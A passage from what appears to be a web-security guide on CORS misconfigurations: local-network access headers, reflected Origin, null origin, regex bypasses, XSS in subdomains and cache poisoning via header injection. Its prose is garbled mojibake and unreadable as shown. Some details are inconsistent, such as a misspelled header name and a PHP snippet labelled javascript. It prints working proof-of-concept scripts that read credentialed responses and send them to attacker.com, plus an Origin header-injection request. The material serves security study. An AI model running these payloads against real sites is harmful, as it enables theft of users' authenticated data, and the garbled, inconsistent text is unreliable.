–ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤ –±–µ–∑–ø–µ–∫–∏.

**–î—ñ–π—Å–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Ç –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ**, —Ç–∞–∫–æ–∂ –ø–æ–≤–∏–Ω–Ω–∞ –º—ñ—Å—Ç–∏—Ç–∏ –≤ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ IP-–∞–¥—Ä–µ—Å–∞ linux **0.0.0.0** –ø—Ä–∞—Ü—é—î –¥–ª—è **–æ–±—Ö–æ–¥—É** —Ü–∏—Ö –≤–∏–º–æ–≥ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ localhost, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü—è IP-–∞–¥—Ä–µ—Å–∞ –Ω–µ –≤–≤–∞–∂–∞—î—Ç—å—Å—è "–ª–æ–∫–∞–ª—å–Ω–æ—é".

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–æ–±—ñ–π—Ç–∏ –≤–∏–º–æ–≥–∏ –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ**, —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ **–ø—É–±–ª—ñ—á–Ω—É IP-–∞–¥—Ä–µ—Å—É –ª–æ–∫–∞–ª—å–Ω–æ—ó —Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—É–±–ª—ñ—á–Ω—É IP-–∞–¥—Ä–µ—Å—É –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞). –û—Å–∫—ñ–ª—å–∫–∏ –≤ –∫—ñ–ª—å–∫–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ **–ø—É–±–ª—ñ—á–Ω–∞ IP** –¥–æ—Å—Ç—É–ø–Ω–∞, —è–∫—â–æ —Ü–µ **–∑ –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ**, –¥–æ—Å—Ç—É–ø –±—É–¥–µ –Ω–∞–¥–∞–Ω–æ.
{% endhint %}

## –í—Ä–∞–∑–ª–∏–≤—ñ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è

–°–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–ª–æ—Å—è, —â–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `Access-Control-Allow-Credentials` –Ω–∞ **`true`** —î –ø–µ—Ä–µ–¥—É–º–æ–≤–æ—é –¥–ª—è –±—ñ–ª—å—à–æ—Å—Ç—ñ **—Ä–µ–∞–ª—å–Ω–∏—Ö –∞—Ç–∞–∫**. –¶–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î –±—Ä–∞—É–∑–µ—Ä—É –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ç–∞ —á–∏—Ç–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å, –ø—ñ–¥–≤–∏—â—É—é—á–∏ –µ—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å –∞—Ç–∞–∫–∏. –ë–µ–∑ —Ü—å–æ–≥–æ –ø–µ—Ä–µ–≤–∞–≥–∞ –≤—ñ–¥ —Ç–æ–≥–æ, —â–æ –±—Ä–∞—É–∑–µ—Ä —Ä–æ–±–∏—Ç—å –∑–∞–ø–∏—Ç, –∞ –Ω–µ –≤–∏ —Å–∞–º—ñ, –∑–º–µ–Ω—à—É—î—Ç—å—Å—è, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫—É–∫—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Å—Ç–∞—î –Ω–µ–º–æ–∂–ª–∏–≤–∏–º.

### –í–∏–Ω—è—Ç–æ–∫: –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–µ—Ä–µ–∂–µ–≤–æ—ó –ª–æ–∫–∞—Ü—ñ—ó —è–∫ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó

–Ü—Å–Ω—É—î –≤–∏–Ω—è—Ç–æ–∫, –∫–æ–ª–∏ –º–µ—Ä–µ–∂–µ–≤–µ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∂–µ—Ä—Ç–≤–∏ –¥—ñ—î —è–∫ —Ñ–æ—Ä–º–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—Ä–∞—É–∑–µ—Ä –∂–µ—Ä—Ç–≤–∏ —è–∫ –ø—Ä–æ–∫—Å—ñ, –æ–±—Ö–æ–¥—è—á–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –Ω–∞ –æ—Å–Ω–æ–≤—ñ IP –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤. –¶–µ–π –º–µ—Ç–æ–¥ –º–∞—î –ø–æ–¥—ñ–±–Ω–æ—Å—Ç—ñ –∑–∞ –≤–ø–ª–∏–≤–æ–º –∑ DNS rebinding, –∞–ª–µ –π–æ–≥–æ –ø—Ä–æ—Å—Ç—ñ—à–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.

### –í—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è `Origin` –≤ `Access-Control-Allow-Origin`

–°—Ü–µ–Ω–∞—Ä—ñ–π –∑ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –∂–∏—Ç—Ç—è, –¥–µ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Origin` –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –≤ `Access-Control-Allow-Origin`, —Ç–µ–æ—Ä–µ—Ç–∏—á–Ω–æ –º–∞–ª–æ–π–º–æ–≤—ñ—Ä–Ω–∏–π —á–µ—Ä–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ –ø–æ—î–¥–Ω–∞–Ω–Ω—è —Ü–∏—Ö –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤. –û–¥–Ω–∞–∫ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∏, —è–∫—ñ –ø—Ä–∞–≥–Ω—É—Ç—å –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ CORS –¥–ª—è –∫—ñ–ª—å–∫–æ—Ö URL-–∞–¥—Ä–µ—Å, –º–æ–∂—É—Ç—å –¥–∏–Ω–∞–º—ñ—á–Ω–æ –≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Access-Control-Allow-Origin`, –∫–æ–ø—ñ—é—é—á–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Origin`. –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –º–æ–∂–µ –≤–≤–µ—Å—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, –æ—Å–æ–±–ª–∏–≤–æ –∫–æ–ª–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –¥–æ–º–µ–Ω –∑ –Ω–∞–∑–≤–æ—é, —â–æ –≤–∏–≥–ª—è–¥–∞—î –ª–µ–≥—ñ—Ç–∏–º–Ω–æ, —Ç–∏–º —Å–∞–º–∏–º –æ–±–º–∞–Ω—é—é—á–∏ –ª–æ–≥—ñ–∫—É –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `null` –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è

`null` –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, –≤–∫–∞–∑–∞–Ω–µ –¥–ª—è —Å–∏—Ç—É–∞—Ü—ñ–π, —Ç–∞–∫–∏—Ö —è–∫ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏ –∞–±–æ –ª–æ–∫–∞–ª—å–Ω—ñ HTML —Ñ–∞–π–ª–∏, –∑–∞–π–º–∞—î —É–Ω—ñ–∫–∞–ª—å–Ω—É –ø–æ–∑–∏—Ü—ñ—é. –î–µ—è–∫—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –≤–∫–ª—é—á–∞—é—Ç—å —Ü–µ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –≤ –±—ñ–ª–∏–π —Å–ø–∏—Å–æ–∫, —â–æ–± –ø–æ–ª–µ–≥—à–∏—Ç–∏ –ª–æ–∫–∞–ª—å–Ω—É —Ä–æ–∑—Ä–æ–±–∫—É, –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –¥–æ–∑–≤–æ–ª—è—é—á–∏ –±—É–¥—å-—è–∫–æ–º—É –≤–µ–±-—Å–∞–π—Ç—É —ñ–º—ñ—Ç—É–≤–∞—Ç–∏ `null` –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è —á–µ—Ä–µ–∑ –ø—ñ—Å–æ—á–Ω–∏—Ü—é iframe, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –æ–±—Ö–æ–¥—è—á–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### –¢–µ—Ö–Ω—ñ–∫–∏ –æ–±—Ö–æ–¥—É —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –≤–∏—Ä–∞–∑—ñ–≤

–ö–æ–ª–∏ –≤–∏ —Å—Ç–∏–∫–∞—î—Ç–µ—Å—è –∑ –±—ñ–ª–∏–º —Å–ø–∏—Å–∫–æ–º –¥–æ–º–µ–Ω—ñ–≤, –≤–∞–∂–ª–∏–≤–æ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –æ–±—Ö–æ–¥—É, —Ç–∞–∫—ñ —è–∫ –¥–æ–¥–∞–≤–∞–Ω–Ω—è –¥–æ–º–µ–Ω—É –∞—Ç–∞–∫—É—é—á–æ–≥–æ –¥–æ –¥–æ–º–µ–Ω—É –∑ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –ø—ñ–¥–¥–æ–º–µ–Ω—ñ–≤. –ö—Ä—ñ–º —Ç–æ–≥–æ, —Ä–µ–≥—É–ª—è—Ä–Ω—ñ –≤–∏—Ä–∞–∑–∏, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—ñ–≤, –º–æ–∂—É—Ç—å –Ω–µ –≤—Ä–∞—Ö–æ–≤—É–≤–∞—Ç–∏ –Ω—é–∞–Ω—Å–∏ –≤ –Ω–∞–∑–≤–∞—Ö –¥–æ–º–µ–Ω—ñ–≤, —â–æ —Å—Ç–≤–æ—Ä—é—î –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–ª—è –æ–±—Ö–æ–¥—É.

### –†–æ–∑—à–∏—Ä–µ–Ω—ñ –æ–±—Ö–æ–¥–∏ —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –≤–∏—Ä–∞–∑—ñ–≤

–®–∞–±–ª–æ–Ω–∏ Regex –∑–∞–∑–≤–∏—á–∞–π –∑–æ—Å–µ—Ä–µ–¥–∂—É—é—Ç—å—Å—è –Ω–∞ –∞–ª—Ñ–∞–≤—ñ—Ç–Ω–æ-—Ü–∏—Ñ—Ä–æ–≤–∏—Ö, –∫—Ä–∞–ø–∫–æ–≤–∏—Ö (.) —Ç–∞ –¥–µ—Ñ—ñ—Å–Ω–∏—Ö (-) —Å–∏–º–≤–æ–ª–∞—Ö, —ñ–≥–Ω–æ—Ä—É—é—á–∏ —ñ–Ω—à—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –¥–æ–º–µ–Ω–Ω–µ —ñ–º'—è, —Å—Ç–≤–æ—Ä–µ–Ω–µ –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º —Å–∏–º–≤–æ–ª—ñ–≤, —è–∫—ñ –±—Ä–∞—É–∑–µ—Ä–∏ —Ç–∞ —à–∞–±–ª–æ–Ω–∏ regex —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å –ø–æ-—Ä—ñ–∑–Ω–æ–º—É, –º–æ–∂–µ –æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –±–µ–∑–ø–µ–∫–∏. –û–±—Ä–æ–±–∫–∞ —Å–∏–º–≤–æ–ª—ñ–≤ –ø—ñ–¥–∫—Ä–µ—Å–ª–µ–Ω–Ω—è –≤ –ø—ñ–¥–¥–æ–º–µ–Ω–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞–º–∏ Safari, Chrome —Ç–∞ Firefox —ñ–ª—é—Å—Ç—Ä—É—î, —è–∫ —Ç–∞–∫—ñ —Ä–æ–∑–±—ñ–∂–Ω–æ—Å—Ç—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –æ–±—Ö–æ–¥—É –ª–æ–≥—ñ–∫–∏ –≤–∞–ª—ñ–¥–∞—Ü—ñ—ó –¥–æ–º–µ–Ω—ñ–≤.

**–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å —Ü—å–æ–≥–æ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –æ–±—Ö–æ–¥—É:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **—Ç–∞** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### –ó XSS –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—ñ–¥–¥–æ–º–µ–Ω—É

–†–æ–∑—Ä–æ–±–Ω–∏–∫–∏ —á–∞—Å—Ç–æ –≤–ø—Ä–æ–≤–∞–¥–∂—É—é—Ç—å –∑–∞—Ö–∏—Å–Ω—ñ –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó CORS, —Å—Ç–≤–æ—Ä—é—é—á–∏ –±—ñ–ª–∏–π —Å–ø–∏—Å–æ–∫ –¥–æ–º–µ–Ω—ñ–≤, —è–∫–∏–º –¥–æ–∑–≤–æ–ª–µ–Ω–æ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ —Ü—ñ –∑–∞–ø–æ–±—ñ–∂–Ω—ñ –∑–∞—Ö–æ–¥–∏, –±–µ–∑–ø–µ–∫–∞ —Å–∏—Å—Ç–µ–º–∏ –Ω–µ —î –±–µ–∑–¥–æ–≥–∞–Ω–Ω–æ—é. –ù–∞—è–≤–Ω—ñ—Å—Ç—å –Ω–∞–≤—ñ—Ç—å –æ–¥–Ω–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –ø—ñ–¥–¥–æ–º–µ–Ω—É –≤ –º–µ–∂–∞—Ö –¥–æ–º–µ–Ω—ñ–≤ –∑ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É –º–æ–∂–µ –≤—ñ–¥–∫—Ä–∏—Ç–∏ –¥–≤–µ—Ä—ñ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó CORS —á–µ—Ä–µ–∑ —ñ–Ω—à—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ, —Ç–∞–∫—ñ —è–∫ XSS (–º—ñ–∂—Å–∞–π—Ç–æ–≤–∏–π —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥).

–©–æ–± –ø—Ä–æ—ñ–ª—é—Å—Ç—Ä—É–≤–∞—Ç–∏, —Ä–æ–∑–≥–ª—è–Ω—å—Ç–µ —Å—Ü–µ–Ω–∞—Ä—ñ–π, –∫–æ–ª–∏ –¥–æ–º–µ–Ω `requester.com` –≤–Ω–µ—Å–µ–Ω–æ –¥–æ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –∑ —ñ–Ω—à–æ–≥–æ –¥–æ–º–µ–Ω—É, `provider.com`. –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ –ø—Ä–∏–±–ª–∏–∑–Ω–æ —Ç–∞–∫:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
–£ —Ü—å–æ–º—É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ –≤—Å—ñ –ø—ñ–¥–¥–æ–º–µ–Ω–∏ `requester.com` –º–∞—é—Ç—å –¥–æ—Å—Ç—É–ø. –û–¥–Ω–∞–∫, —è–∫—â–æ –ø—ñ–¥–¥–æ–º–µ–Ω, —Å–∫–∞–∂—ñ–º–æ, `sub.requester.com`, —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å XSS, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü—ñ—î—é —Å–ª–∞–±–∫—ñ—Å—Ç—é. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ—Å—Ç—É–ø–æ–º –¥–æ `sub.requester.com` –º–æ–∂–µ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å XSS, —â–æ–± –æ–±—ñ–π—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏ CORS —ñ –∑–ª–æ–≤–º–∏—Å–Ω–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –Ω–∞ `provider.com`.

### **–û—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞**

[**–ó —Ü—å–æ–≥–æ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

–Ü—Å–Ω—É—î –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å, —â–æ —à–ª—è—Ö–æ–º –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –æ—Ç—Ä—É—î–Ω–Ω—è –∫–µ—à—É –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ —á–µ—Ä–µ–∑ —ñ–Ω'—î–∫—Ü—ñ—é HTTP –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ –º–æ–∂–Ω–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –∑–±–µ—Ä–µ–∂–µ–Ω—É –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å Cross-Site Scripting (XSS). –¶–µ–π —Å—Ü–µ–Ω–∞—Ä—ñ–π —Ä–æ–∑–≥–æ—Ä—Ç–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –¥–æ–¥–∞—Ç–æ–∫ –Ω–µ –æ—á–∏—â–∞—î –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Origin` –≤—ñ–¥ –Ω–µ–∑–∞–∫–æ–Ω–Ω–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤, —Å—Ç–≤–æ—Ä—é—é—á–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, –æ—Å–æ–±–ª–∏–≤–æ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ Internet Explorer —Ç–∞ Edge. –¶—ñ –±—Ä–∞—É–∑–µ—Ä–∏ —Ç—Ä–∞–∫—Ç—É—é—Ç—å (0x0d) —è–∫ –∑–∞–∫–æ–Ω–Ω–∏–π —Ç–µ—Ä–º—ñ–Ω–∞—Ç–æ—Ä HTTP –∑–∞–≥–æ–ª–æ–≤–∫–∞, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —ñ–Ω'—î–∫—Ü—ñ—ó HTTP –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤.

–†–æ–∑–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∑–∞–ø–∏—Ç, –¥–µ –º–∞–Ω—ñ–ø—É–ª—é—î—Ç—å—Å—è –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Origin`:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer —Ç–∞ Edge —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å —è–∫:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
–•–æ—á–∞ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å—Ñ–æ—Ä–º–æ–≤–∞–Ω–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞ –≤–µ–±-–±—Ä–∞—É–∑–µ—Ä–æ–º —î –Ω–µ–¥–æ—Ü—ñ–ª—å–Ω–∏–º, —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–∏–π –∑–∞–ø–∏—Ç –º–æ–∂–Ω–∞ –≤—Ä—É—á–Ω—É –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ Burp Suite. –¶–µ–π –º–µ—Ç–æ–¥ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Ç–æ–≥–æ, —â–æ –∫–µ—à –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ –≤—ñ–¥–ø–æ–≤—ñ–¥—å —ñ –Ω–µ–Ω–∞–≤–º–∏—Å–Ω–æ –Ω–∞–¥–∞–≤–∞—Ç–∏–º–µ —ó—ó —ñ–Ω—à–∏–º. –°–ø–µ—Ü—ñ–∞–ª—å–Ω–æ –ø—ñ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–∏–π –≤–∞–Ω—Ç–∞–∂ –º–∞—î –Ω–∞ –º–µ—Ç—ñ –∑–º—ñ–Ω–∏—Ç–∏ –Ω–∞–±—ñ—Ä —Å–∏–º–≤–æ–ª—ñ–≤ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –Ω–∞ UTF-7, –∫–æ–¥—É–≤–∞–Ω–Ω—è —Å–∏–º–≤–æ–ª—ñ–≤, —è–∫–µ —á–∞—Å—Ç–æ –∞—Å–æ—Ü—ñ—é—î—Ç—å—Å—è –∑ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—è–º–∏ XSS —á–µ—Ä–µ–∑ –π–æ–≥–æ –∑–¥–∞—Ç–Ω—ñ—Å—Ç—å –∫–æ–¥—É–≤–∞—Ç–∏ —Å–∏–º–≤–æ–ª–∏ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, —â–æ —ó—Ö –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —è–∫ —Å–∫—Ä–∏–ø—Ç —É –ø–µ–≤–Ω–∏—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö.

–î–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ —á–∏—Ç–∞–Ω–Ω—è –ø—Ä–æ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XSS –¥–∏–≤—ñ—Ç—å—Å—è [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

